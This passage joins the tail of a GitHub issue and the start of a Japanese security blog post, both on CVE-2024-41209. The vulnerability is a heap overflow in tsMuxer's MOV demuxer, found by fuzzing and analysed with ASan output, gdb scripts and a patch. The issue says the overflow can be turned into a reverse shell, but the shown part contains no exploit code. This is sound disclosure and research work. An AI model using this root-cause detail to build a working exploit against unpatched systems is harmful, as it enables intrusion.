fa fa fa fa fa fa fa fa fa fa fa fa   0x0c2a7fff8210: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c2a7fff8220: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c2a7fff8230: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb   Shadow gap:              cc ==29495==ABORTING ```  It is caused by two Bug   * The first one is "buffer over-parse" in `mov_read_stsd()`.      [tsMuxer/tsMuxer/movDemuxer.cpp](https://github.com/justdan96/tsMuxer/blob/75c9cb3514815d07378007d36cc90c3f209e7b36/tsMuxer/movDemuxer.cpp#L1522)  Line 1522 in [75c9cb3](/justdan96/tsMuxer/commit/75c9cb3514815d07378007d36cc90c3f209e7b36)   |  | a.size = size - (m\_processedBytes - start\_pos); | | --- | --- |      `a.size` is a value calculated based on user input, but it does not take min with the size of stsd, that is, `atom.size - ( m_processedBytes - start_pos)`. When `a.size` is large, assuming a very large atom exists under stsd, all subsequent input would be subject to `ParseEntryTable` under `mov_read_stsd`.   * The second one is `ctts_count` is not initialized with `entries` in `mov_read_ctts`.      [tsMuxer/tsMuxer/movDemuxer.cpp](https://github.com/justdan96/tsMuxer/blob/75c9cb3514815d07378007d36cc90c3f209e7b36/tsMuxer/movDemuxer.cpp#L1189-L1191)  Lines 1189 to 1191 in [75c9cb3](/justdan96/tsMuxer/commit/75c9cb3514815d07378007d36cc90c3f209e7b36)   |  | const unsigned entries = get\_be32(); | | --- | --- | |  | st->ctts\_data.resize(entries); | |  | for (unsigned i = 0; i < entries; i++) |      When calling in the order of `mov_read_trun` -> `mov_read_ctts` -> `mov_read_trun`, the vector of `ctts_data` is resized in `mov_read_ctts` but `ctts_count` remains, so a heap buffer overflow occurs at the following place in the second `mov_read_trun`.     [tsMuxer/tsMuxer/movDemuxer.cpp](https://github.com/justdan96/tsMuxer/blob/75c9cb3514815d07378007d36cc90c3f209e7b36/tsMuxer/movDemuxer.cpp#L1100-L1102)  Lines 1100 to 1102 in [75c9cb3](/justdan96/tsMuxer/commit/75c9cb3514815d07378007d36cc90c3f209e7b36)   |  | sc->ctts\_data.emplace\_back(); | | --- | --- | |  | sc->ctts\_data[sc->ctts\_count].count = 1; | |  | sc->ctts\_data[sc->ctts\_count].duration = get\_be32(); |      The first bug makes it easier for the second bug to ignite.  This heap overflow has the potential to destroy the heap to some extent at will.  Ricerca Security, Inc. |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@iwashiira](https://avatars.githubusercontent.com/u/89283357?s=80&u=6e0b6aa62f0ecb9bcd58895605b3c60ac934dea1&v=4)](/iwashiira)

Copy link

Contributor

Author

### **[iwashiira](/iwashiira)** commented [Mar 13, 2024](#issuecomment-1994291334)

| This input seems to cause other memory leaks, so we will continue to investigate. |
| --- |

All reactions

Sorry, something went wrong.

[![@iwashiira](https://avatars.githubusercontent.com/u/89283357?s=80&u=6e0b6aa62f0ecb9bcd58895605b3c60ac934dea1&v=4)](/iwashiira)

Copy link

Contributor

Author

### **[iwashiira](/iwashiira)** commented [Mar 13, 2024](#issuecomment-1994367193)

| The following`size`s also need to be compared with `atom.size` as well as first bug.   [tsMuxer/tsMuxer/movDemuxer.cpp](https://github.com/justdan96/tsMuxer/blob/75c9cb3514815d07378007d36cc90c3f209e7b36/tsMuxer/movDemuxer.cpp#L1510-L1519)  Lines 1510 to 1519 in [75c9cb3](/justdan96/tsMuxer/commit/75c9cb3514815d07378007d36cc90c3f209e7b36)   |  | else if (st->type == IOContextTrackType::SUBTITLE) | | --- | --- | |  | { | |  | const MOVAtom fake\_atom(0, 0, size - (m\_processedBytes - start\_pos)); | |  | mov\_read\_glbl(fake\_atom); | |  | } | |  | else | |  | { | |  | // other codec type, just skip (rtp, mp4s, tmcd ...) | |  | skip\_bytes(size - (m\_processedBytes - start\_pos)); | |  | } | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

All reactions

Sorry, something went wrong.

This was referenced Mar 22, 2024

[heap buffer "over-parse" is found in movDemuxer::mov\_read\_stsd
#850](/justdan96/tsMuxer/issues/850)

Closed

[initialize ctts\_count to 0 and shrink ctts\_data
#851](/justdan96/tsMuxer/pull/851)
 Merged

[![@iwashiira](https://avatars.githubusercontent.com/u/89283357?s=80&u=6e0b6aa62f0ecb9bcd58895605b3c60ac934dea1&v=4)](/iwashiira)

Copy link

Contributor

Author

### **[iwashiira](/iwashiira)** commented [Mar 22, 2024](#issuecomment-2014715781)

| this heap buffer overflow is exploitable (reverse shell can be activated).  The ASAN of mov\_read\_trun has not completely disappeared, but at least the heap buffer overflow has been completely mitigated by PR [#851](https://github.com/justdan96/tsMuxer/pull/851) . |
| --- |

All reactions

Sorry, something went wrong.

[![@jcdr428](https://avatars.githubusercontent.com/u/56721609?s=40&v=4)](/jcdr428)
[jcdr428](/jcdr428)
closed this as [completed](/justdan96/tsMuxer/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#851](/justdan96/tsMuxer/pull/851)
[Apr 3, 2024](#event-12335755047)

[![@donnafaye0323](https://avatars.githubusercontent.com/u/40868495?s=40&v=4)](/donnafaye0323)
[donnafaye0323](/donnafaye0323)
mentioned this issue
[Apr 15, 2024](#ref-issue-2242211653)

[Problem With Importing MP4 Files
#866](/justdan96/tsMuxer/issues/866)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fjustdan96%2FtsMuxer%2Fissues%2F841)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [initialize ctts\_count to 0 and shrink ctts\_data](/justdan96/tsMuxer/pull/851)
 [iwashiira/tsMuxer](/iwashiira/tsMuxer)

1 participant

[![@iwashiira](https://avatars.githubusercontent.com/u/89283357?s=52&v=4)](/iwashiira)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from ricercasecurity.blogspot.com_535df06a_20250114_193301.html ===


# [Ricerca Security](https://ricercasecurity.blogspot.com/)

News and updates from the Ricerca Security

## Friday, October 25, 2024

### rezzufを用いた0-dayエクスプロイトの開発 [CVE-2024-41209]

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg02B8hUbcD9svOOJ3PZ-DCSFK2kUbGXyAtxPe43HGbtzWYj5r4joVY4uOlLQ60irK6BdUSmQLJY5ZLigRgExDM5rtUD-dcnlsIIxtygXg8MWoP4DpP74xRP3ox8WJIOqP2i9Uqk1kWlHSHvxhFQTnajjESVY7lr8RJDhmg__FcjOwbKU1XcLgcaBpECQMh/s1200/tsmuxer_ogp.png)

著者: iwashiira, ptr-yudai

## はじめに

弊社ではfuzzufというファジングフレームワークを開発しています。ファジングとはプログラムの入力をランダムに生成して実行し、プログラムが異常な動作を引き起こす入力を探すソフトウェアテスト技術です。fuzzufの詳しい解説は以前の[ブログ記事](https://ricercasecurity.blogspot.com/2021/12/fuzzuf-fuzzing-unification-framework_36.html)をご覧ください。

私たちは、より強力なFuzzerを作成するために日々研究開発を行なっています。 fuzzufを用いることで、開発したFuzzerを手軽に実行できるだけでなく、容易にFuzzer同士を比較検証することができます。

私たちはfuzzufを拡張して、新たにrezzufというファジングアルゴリズムを実装しました。さらに、rezzufを利用して[tsMuxer](https://github.com/justdan96/tsMuxer)から0-day脆弱性を発見しました。本記事ではその脆弱性CVE-2024-41209の原理と解析手順、そして攻撃コードを解説します。

## CVE-2024-41209

CVE-2024-41209は[tsMuxer](https://github.com/justdan96/tsMuxer)のMOVファイルのDemuxerに含まれていた脆弱性で、弊社メンバーのArata, ptr-yudai, iwashiiraが発見・報告しました。

tsMuxerはC++で書かれたオープンソースプロジェクトで、動画ファイルを扱うアプリケーションです。動画ファイルの中でも、映像・音声・字幕といったメディアの構成要素のことをエレメンタリーストリームと呼びます。これらエレメンタリーストリームをMP4, MKV, TSといった１つのコンテナファイルに統合する操作のことをmuxingと呼び、逆に分割する操作のことをdemuxingと呼びます。また、１つのコンテナファイルを別の形式のコンテナファイルに変換する操作をremuxingと呼びます。tsMuxerはこれらmuxing, demuxing, remuxingを扱うソフトウェアで、クライアントサイドのみならず、Universal Media Serverなどのサーバーサイドでも利用されています。

tsMuxerは複数のコンテナ形式をサポートしていますが、rezzufによるファジングの結果、MOVやMKV, VOBやTS向けのDemuxerに脆弱性や潜在的な問題があることがわかりました。特にMOV形式のDemuxerの脆弱性（CVE-2024-41209）ではエクスプロイト可能であり、また技術的にも興味深い点があることから、本ブログ記事にて紹介したいと思います。

### MOVファイルの構造

今回見つけたバグの１つは、MOVファイルのパースに際して起きる脆弱性でした。脆弱性が発火する原理を理解して攻撃可能性を調べるために、まずはMOVファイルの構造を簡単に説明します。

MOVファイルといえば、代表的な動画ファイル形式の１つです。MOVファイルは複数のトラックと呼ばれる要素から構成され、各トラックはmovie, audioなどといった各種データを持っています。ファイルフォーマットとしては、atomという構成単位で階層化された構造になっています。

MOVファイルを `hexdump -C` 表示した結果を確認してみましょう。

```
$ hexdump -C test.mov
...
28 b1 00 00 00 80 73 74  63 6f 00 00 00 00 00 00  |(.....stco......|
00 1c 00 00 00 24 00 00  ca fe 00 00 cf 3c 00 00  |.....$.......<..|
d1 37 00 00 d6 78 00 00  d8 64 00 00 de cf 00 01  |.7...x...d......|
09 2b 00 01 35 32 00 01  61 3a 00 01 8b 95 00 01  |.+..52..a:......|
b7 9d 00 01 e1 f9 00 02  0e 00 00 02 38 5c 00 02  |............8\..|
64 64 00 02 8e bf 00 02  ba c7 00 02 e6 ce 00 03  |dd..............|
11 2a 00 03 3d 31 00 03  67 8e 00 03 93 94 00 03  |.*..=1..g.......|
bd f1 00 03 e9 f8 00 04  15 fe 00 04 40 5b 00 04  |............@[..|
6c 62 00 00 04 dc 74 72  61 6b 00 00 00 5c 74 6b  |lb....trak...\tk|
68 64 00 00 00 03 00 00  00 00 00 00 00 00 00 00  |hd..............|

```

`trak` や `tkhd` などの小文字のアルファベット4文字の文字列が散在していますが、これがatomの種類を表す名前（MKTAG）にあたります。atomは階層構造のため、１つのatomがさらに子にあたるatomを持つ場合があります。

例えば、上の例ではtkhdアトムはtrakアトムを包含しています。オフセット0x49b92からの4バイトにある値0x4dcがtrakアトムのサイズになりますが、その範囲内にtkhdアトムが配置されていることがわかります。

mp4dumpなどのコマンドでatomの階層構造を確認することもできます。

### tsMuxerのMOV demuxing

tsMuxerにおいて、demuxingの際のMOVファイルのパース処理はmovDemuxer.cppおよびmovDemuxer.hに記述されています。 `MovDemuxer::mov_read_default()` と `MovDemuxer::ParseTableEntry()` が核となる処理です。

`MovDemuxer::mov_read_default()`では親のatomの情報を引数のMOVAtom構造体から受け取ります。その後、子のatomの情報をMOVAtom構造体のsizeとtypeに格納した上で、`MovDemuxer::ParseTableEntry()`にこのMOVAtom構造体を渡しながら呼び出します。`MovDemuxer::ParseTableEntry()`はMKTAGに応じて、trakアトムならば`MovDemuxer::mov_read_trak()` を、といったように各種アトム用に作られた関数を呼び出します。各種アトム用に作られた関数ではそのアトムをパースし、もし内包されているアトムがあれば`MovDemuxer::mov_read_default()` を呼ぶ、といった形で核となる処理に制御を戻し、順次アトムの階層構造をdemuxしていきます。

MovDemuxer::mov\_read\_default()

MovDemuxer::ParseTableEntry()

##

## 脆弱性の根本原因を特定

rezzufによるファジングの結果、 `MovDemuxer::mov_read_trun()` 内でheap-buffer-overflowと分類されるクラッシュが見つかりました。このクラッシュを引き起こした入力を元に、根本原因を特定しましょう。

ファジングの際には特定の関数に絞って入力を渡すようなコードを使用しており、そのようなコードをハーネスと呼びます。

ファジングに使用した具体的なハーネス、およびクラッシュ入力となるMOVファイルは[Githubのissue](https://github.com/justdan96/tsMuxer/issues/841)を確認ください。また、詳細なASAN Reportとmp4dumpの結果は、[リポジトリ](https://github.com/RICSecLab/CVE-2024-41209)をご覧ください。

まず、クラッシュが起きている箇所である MovDemuxer::mov\_read\_trun() の処理を確認しましょう。

```
int MovDemuxer::mov_read_trun(MOVAtom atom)
{
    MOVFragment* frag = &fragment;
    unsigned data_offset = 0;

    if (frag->track_id <= 0 || frag->track_id > num_tracks)
        return -1;
    Track* st = tracks[frag->track_id - 1];
    const auto sc = reinterpret_cast<MOVStreamContext*>(st);
    if (sc->pseudo_stream_id + 1 != frag->stsd_id)
        return 0;
    get_byte();  // version
    const unsigned flags = get_be24();
    const unsigned entries = get_be32();
    if (flags & 0x001)
        data_offset = get_be32();
    if (flags & 0x004)
        get_be32();  // first_sample_flags
    int64_t offset = frag->base_data_offset + data_offset;
    sc->chunk_offsets.push_back(offset);
    for (size_t i = 0; i < entries; i++)
    {
        unsigned sample_size = frag->size;

        if (flags & 0x100)
            get_be32();  // sample_duration
        if (flags & 0x200)
            sample_size = get_be32();
        if (flags & 0x400)
            get_be32();  // sample_flags
        if (flags & 0x800)
        {
            sc->ctts_data.emplace_back();
            sc->ctts_data[sc->ctts_count].count = 1;
            sc->ctts_data[sc->ctts_count].duration = get_be32();
            sc->ctts_count++;
        }

        // assert(sample_duration % sc->time_rate == 0);
        offset += sample_size;
    }
    frag->moof_offset = offset;
    return 0;
}

```

trunというアトムのflagsについて、0x800に相当するbitが立っている時に、ベクター `sc->ctts_data` に `sc->ctts_count` をindexとして、countに1を、durationにファイルから読み込んだ32bitをそれぞれ書き込んでいます。クラッシュログはこの箇所でheap-buffer-overflowが起きていることを示唆しているため、heapに確保されたベクターへの書き込み処理で範囲外参照（OOB; out-of-bounds）が起きていると考えられます。

ctts\_dataのベクターは、グローバル変数として確保されている構造体中のtracksという配列を経由してアクセスされます。バグが起きる根本原因を調べるため、ctts\_dataベクターへの操作全般と関連する変数の値を確認していきましょう。

### 解析の下準備

関連する変数の値を適宜確認するために、今回はgdbスクリプトを使用します。gdbスクリプトはデバッグ情報付きのバイナリをソースコードと共にデバッグする際に、非常に強力な解析能力を提供してくれます。tsMuxerが配布しているバイナリのビルド方法を確認し、ビルドスクリプトに手を加えて解析用のバイナリをビルドしましょう。

[GitHubのworkflow](https://github.com/justdan96/tsMuxer/blob/master/.github/workflows/nightly.yml)を確認すると、 `scripts/rebuild_linux_with_gui_docker.sh` を実行することで配布バイナリをビルドしています。cmakeのbuildオプションに `-DCMAKE_BUILD_TYPE=Debug` を加えるなどした後、 `justdan96/tsmuxer_build` という専用のdocker image内でスクリプトを実行することで配布バイナリとほぼ同一のデバッグ用のバイナリを生成できます。

```
diff --git a/scripts/rebuild_linux_with_gui_docker.sh b/scripts/rebuild_linux_with_gui_docker.sh
index 7823b58..44488f8 100755
--- a/scripts/rebuild_linux_with_gui_docker.sh
+++ b/scripts/rebuild_linux_with_gui_docker.sh
@@ -1,12 +1,11 @@
 rm -rf build
 mkdir build
 cd build
-cmake  -DTSMUXER_GUI=ON -DTSMUXER_STATIC_BUILD=ON -DFREETYPE_LDFLAGS=png ../
+cmake  -DTSMUXER_GUI=ON -DTSMUXER_STATIC_BUILD=ON -DFREETYPE_LDFLAGS=png -DCMAKE_BUILD_TYPE=Debug ../
 make
 cp tsMuxer/tsmuxer ../bin/tsMuxeR
 cp tsMuxerGUI/tsMuxerGUI ../bin/tsMuxerGUI
 cd ..
-rm -rf build
 mkdir ./bin/lnx
 mv ./bin/tsMuxeR ./bin/lnx/tsMuxeR

```
```
$ docker pull justdan96/tsmuxer_build
$ docker run -it --rm -v $(pwd):/workdir -w="/workdir" justdan96/tsmuxer_build bash
# ./scripts/rebuild_linux_with_gui_docker.sh

```

後は、gdb script側でコンテナ内でのcmake時のproject rootのパスをホスト上のパスに変換してやれば、ソースコード付きでデバッグすることが可能となります。

```
import gdb

gdb.execute('set substitute-path /workdir .')
gdb.execute('b MovDemuxer::mov_read_trun')
gdb.execute('r')

```
### アトムの“over-parse”の発見

解析作業に着手し始めてすぐに、 `MovDemuxer::mov_read_trun()` が6回も実行されていることに気づきます。クラッシュ入力のMOVファイルにはtrunアトムのMKTAGは一つしか存在しないため、これは非常におかしなことです。例えば3回目に`MovDemuxer::mov_read_trun()` でbreakした際のstack traceを確認してみましょう。解析の下準備にてソースコードと共にデバッグする環境を整えたおかげで、stack traceに積まれている関数がかつてcallされた時にはどのような引数を伴っていたのか容易に確認できます。

```
gef> bt
#0  MovDemuxer::mov_read_trun (this=0x939e30, atom={type = 0x6e757274, offset = 0x41db, size = 0x60}) at /workdir/tsMuxer/movDemuxer.cpp:1070
#1  0x00000000004ba65a in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x6e757274, offset = 0x41db, size = 0x60}) at /workdir/tsMuxer/movDemuxer.cpp:919
#2  0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x66617274, offset = 0x41b3, size = 0x88}) at /workdir/tsMuxer/movDemuxer.cpp:974
#3  0x00000000004ba32a in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x66617274, offset = 0x41b3, size = 0x88}) at /workdir/tsMuxer/movDemuxer.cpp:866
#4  0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x666f6f6d, offset = 0x419b, size = 0xa0}) at /workdir/tsMuxer/movDemuxer.cpp:974
#5  0x00000000004bbd97 in MovDemuxer::mov_read_moof (this=0x939e30, atom={type = 0x666f6f6d, offset = 0x419b, size = 0xa0}) at /workdir/tsMuxer/movDemuxer.cpp:1291
#6  0x00000000004ba47e in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x666f6f6d, offset = 0x419b, size = 0xa0}) at /workdir/tsMuxer/movDemuxer.cpp:891
#7  0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x666f6f6d, offset = 0x2ba8, size = 0x3b3b0f3d}) at /workdir/tsMuxer/movDemuxer.cpp:974
#8  0x00000000004bbd97 in MovDemuxer::mov_read_moof (this=0x939e30, atom={type = 0x666f6f6d, offset = 0x2ba8, size = 0x3b3b0f3d}) at /workdir/tsMuxer/movDemuxer.cpp:1291
#9  0x00000000004ba47e in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x666f6f6d, offset = 0x2ba8, size = 0x3b3b0f3d}) at /workdir/tsMuxer/movDemuxer.cpp:891
#10 0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x0, offset = 0x0, size = 0x3b3b3ae5}) at /workdir/tsMuxer/movDemuxer.cpp:974
#11 0x00000000004bc798 in MovDemuxer::mov_read_stsd (this=0x939e30, atom={type = 0x64737473, offset = 0x20b, size = 0x93}) at /workdir/tsMuxer/movDemuxer.cpp:1526
#12 0x00000000004ba528 in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x64737473, offset = 0x20b, size = 0x93}) at /workdir/tsMuxer/movDemuxer.cpp:901
#13 0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x6c627473, offset = 0x203, size = 0xdf}) at /workdir/tsMuxer/movDemuxer.cpp:974
#14 0x00000000004ba32a in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x6c627473, offset = 0x203, size = 0xdf}) at /workdir/tsMuxer/movDemuxer.cpp:866
#15 0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x666e696d, offset = 0x1c3, size = 0x11f}) at /workdir/tsMuxer/movDemuxer.cpp:974
#16 0x00000000004ba32a in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x666e696d, offset = 0x1c3, size = 0x11f}) at /workdir/tsMuxer/movDemuxer.cpp:866
#17 0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x6169646d, offset = 0x16e, size = 0x174}) at /workdir/tsMuxer/movDemuxer.cpp:974
#18 0x00000000004ba32a in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x6169646d, offset = 0x16e, size = 0x174}) at /workdir/tsMuxer/movDemuxer.cpp:866
#19 0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x6b617274, offset = 0x10a, size = 0x1d8}) at /workdir/tsMuxer/movDemuxer.cpp:974
#20 0x00000000004bb351 in MovDemuxer::mov_read_trak (this=0x939e30, atom={type = 0x6b617274, offset = 0x10a, size = 0x1d8}) at /workdir/tsMuxer/movDemuxer.cpp:1143
#21 0x00000000004ba5f4 in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x6b617274, offset = 0x10a, size = 0x1d8}) at /workdir/tsMuxer/movDemuxer.cpp:913
#22 0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x766f6f6d, offset = 0x5e, size = 0x2e5}) at /workdir/tsMuxer/movDemuxer.cpp:974
#23 0x00000000004bbd17 in MovDemuxer::mov_read_moov (this=0x939e30, atom={type = 0x766f6f6d, offset = 0x5e, size = 0x2e5}) at /workdir/tsMuxer/movDemuxer.cpp:1280
#24 0x00000000004ba4a0 in MovDemuxer::ParseTableEntry (this=0x939e30, atom={type = 0x766f6f6d, offset = 0x5e, size = 0x2e5}) at /workdir/tsMuxer/movDemuxer.cpp:893
#25 0x00000000004ba852 in MovDemuxer::mov_read_default (this=0x939e30, atom={type = 0x0, offset = 0x0, size = 0x7fffffffffffffff}) at /workdir/tsMuxer/movDemuxer.cpp:974
#26 0x00000000004b8e43 in MovDemuxer::readHeaders (this=0x939e30) at /workdir/tsMuxer/movDemuxer.cpp:696
#27 0x00000000004b8923 in MovDemuxer::openFile (this=0x939e30, streamName=@0x7fffffffdc70: {static npos = 0xffffffffffffffff, _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>}, _M_p = 0x7fffffffdc80 "../vuln15.mov"}, _M_string_length = 0xd, {_M_local_buf = "../vuln15.mov\\000\\000", _M_allocated_capacity = 0x316e6c75762f2e2e}}) at /workdir/tsMuxer/movDemuxer.cpp:657
#28 0x000000000048b87c in METADemuxer::DetectStreamReader (readManager=@0x908200: {m_fileReaders = {<std::_Vector_base<BufferedReader*, std::allocator<BufferedReader*> >> = {_M_impl = {<std::allocator<BufferedReader*>> = {<__gnu_cxx::new_allocator<BufferedReader*>> = {<No data fields>}, <No data fields>}, <std::_Vector_base<BufferedReader*, std::allocator<BufferedReader*> >::_Vector_impl_data> = {_M_start = 0x921ca0, _M_finish = 0x921cb0, _M_end_of_storage = 0x921cb0}, <No data fields>}}, <No data fields>}, m_readersCnt = 0x2, m_blockSize = 0x200000, m_allocSize = 0x208000, m_prereadThreshold = 0x100000}, fileName=@0x7fffffffdc70: {static npos = 0xffffffffffffffff, _M_dataplus = {<std::allocator<char>> = {<__gnu_cxx::new_allocator<char>> = {<No data fields>}, <No data fields>}, _M_p = 0x7fffffffdc80 "../vuln15.mov"}, _M_string_length = 0xd, {_M_local_buf = "../vuln15.mov\\000\\000", _M_allocated_capacity = 0x316e6c75762f2e2e}}, calcDuration=0x1) at /workdir/tsMuxer/metaDemuxer.cpp:608
#29 0x000000000046672c in detectStreamReader (fileName=0x7fffffffe823 "../vuln15.mov", mplsParser=0x0, isSubMode=0x0) at /workdir/tsMuxer/main.cpp:114
#30 0x000000000046964a in main (argc=0x2, argv=0x7fffffffe5c8) at /workdir/tsMuxer/main.cpp:689

```

各引数を確認していきましょう。`MovDemuxer::mov_read_stsd()` 後に `MovDemuxer::mov_read_default()` を実行する際のsizeが、親アトムのstsdアトムのサイズと比べて非常に大きな値になってしまっています。 stsdアトムとして解釈されるべきMOVファイルのオフセットの範囲を越えて、現在のstsdアトムの開始オフセットからファイル末尾までに存在するMKTAG全てが、 stsdアトムの子アトムとしてparseされてしまっているのです。その結果、一つの `trun` MKTAGに対して複数の`MovDemuxer::mov_read_trun()` が呼ばれることになります。

このheap buffer “over-parse”とも呼べるようなバグの原因をソースコード上で確認しましょう。`MovDemuxer::mov_read_stsd()` の中で、`MovDemuxer::mov_read_default()`に渡される、MOVAtom構造体 `a` の `a.size` はsizeというローカル変数を用いて計算されており、このローカル変数sizeはユーザー入力であるMOVファイルから読み取っています。stsdアトムのサイズである `atom.size` とsizeを比較する範囲チェックが存在しないことが“over-parse”の原因です。

```
int MovDemuxer::mov_read_stsd(MOVAtom atom)
{
    if (num_tracks == 0)
        return -1;
    const auto st = reinterpret_cast<MOVStreamContext*>(tracks[num_tracks - 1]);

    get_byte();  // version
    get_be24();  // flags

    const unsigned entries = get_be32();

    for (unsigned pseudo_stream_id = 0; pseudo_stream_id < entries; pseudo_stream_id++)
    {
        // Parsing Sample description table
        // enum CodecID id;
        MOVAtom a;
        const int64_t start_pos = m_processedBytes;
        const unsigned size = get_be32();    // size <- ユーザー入力
        const uint32_t format = get_le32();  // data format

				...

        // this will read extra atoms at the end (wave, alac, damr, avcC, SMI ...)
        a.size = size - (m_processedBytes - start_pos); // <- a.sizeを計算
        if (a.size > 8)
        {
            if (mov_read_default(a) < 0)
                return -1;
        }
        else if (a.size > 0)
            skip_bytes(a.size);
    }
    return 0;
}

```

この脆弱性には以下のようなパッチを当てました。

```
int MovDemuxer::mov_read_stsd(MOVAtom atom)
{
		...
        a.size = size - (m_processedBytes - start_pos);
+        if (a.size > atom.size) {
+            THROW(ERR_MOV_PARSE, "MP4/MOV error: Invalid a.size in mov_read_stsd")
+        }
        if (a.size > 8)
        {
            if (mov_read_default(a) < 0)
                return -1;
        }
        else if (a.size > 0)
            skip_bytes(a.size);
    }
    return 0;
}

```
### ctts\_dataのベクターが壊れる原因

さて、`MovDemuxer::mov_read_trun()` が複数回呼ばれているという不可解な現象の根本原因を特定し、heap buffer “over-parse”脆弱性に対するパッチを当てることはできましたが、ASAN Reportがheap buffer overflowと分類したctts\_dataのベクターを壊している原因は未だ特定できていません。gdb scriptを駆使して、複数回の`MovDemuxer::mov_read_trun()` の実行を跨いだctts\_dataベクターに関連する変数の遷移を確認しましょう。

`MovDemuxer::mov_read_trun()` 内では `ctts_data.emplace_back()` でctts\_dataベクターの末尾に要素を確保した後にctts\_countをindexとして書き込みを行っています。emplace\_back()というメンバー関数は、ベクターのsizeをインクリメントした後にcapacityの値と比較し、sizeの方が大きい場合はベクターの領域が足りないということでヒープ領域にベクターを再確保します。そのため、具体的な変数としてはctts\_countとctts\_dataベクターのsizeとcapacityの遷移を確認します。生成されたバイナリでは、capacity()メンバー関数はインライン化されていてgdbからcallするのは難しいですが、 vectorの `_M_impl._M_end_of_storage` から `_M_impl._M_start` を引くことで計算できます。

```
import gdb
gdb.execute('set substitute-path /workdir .')
gdb.execute('b movDemuxer.cpp:1078')
gdb.execute('r')
for i in range(0, 6):
    print("sc->ctts_data.size()")
    gdb.execute('p/x sc->ctts_data.size()')
    print("sc->ctts_data.capacity()")
    gdb.execute('p/x sc->ctts_data._M_impl._M_end_of_storage - sc->ctts_data._M_impl._M_start')
    print("sc->ctts_count")
    gdb.execute('p/x sc->ctts_count')
    if (i == 5):
        break
    gdb.execute('c')

```
```
Thread 1 "tsMuxeR" hit Breakpoint 1, MovDemuxer::mov_read_trun (this=0x939e30, atom=...) at /workdir/tsMuxer/movDemuxer.cpp:1078
1078	    if (sc->pseudo_stream_id + 1 != frag->stsd_id)
sc->ctts_data.size()
$1 = 0x0
sc->ctts_data.capacity()
$2 = 0x0
sc->ctts_count
$3 = 0x0

Thread 1 "tsMuxeR" hit Breakpoint 1, MovDemuxer::mov_read_trun (this=0x939e30, atom=...) at /workdir/tsMuxer/movDemuxer.cpp:1078
1078	    if (sc->pseudo_stream_id + 1 != frag->stsd_id)
sc->ctts_data.size()
$4 = 0xa
sc->ctts_data.capacity()
$5 = 0x10
sc->ctts_count
$6 = 0xa

Thread 1 "tsMuxeR" hit Breakpoint 1, MovDemuxer::mov_read_trun (this=0x939e30, atom=...) at /workdir/tsMuxer/movDemuxer.cpp:1078
1078	    if (sc->pseudo_stream_id + 1 != frag->stsd_id)
sc->ctts_data.size()
$7 = 0x14
sc->ctts_data.capacity()
$8 = 0x20
sc->ctts_count
$9 = 0x14

Thread 1 "tsMuxeR" hit Breakpoint 1, MovDemuxer::mov_read_trun (this=0x939e30, atom=...) at /workdir/tsMuxer/movDemuxer.cpp:1078
1078	    if (sc->pseudo_stream_id + 1 != frag->stsd_id)
sc->ctts_data.size()
$10 = 0x0
sc->ctts_data.capacity()
$11 = 0x20
sc->ctts_count
$12 = 0x1e

Thread 1 "tsMuxeR" hit Breakpoint 1, MovDemuxer::mov_read_trun (this=0x939e30, atom=...) at /workdir/tsMuxer/movDemuxer.cpp:1078
1078	    if (sc->pseudo_stream_id + 1 != frag->stsd_id)
sc->ctts_data.size()
$13 = 0xa
sc->ctts_data.capacity()
$14 = 0x20
sc->ctts_count
$15 = 0x28

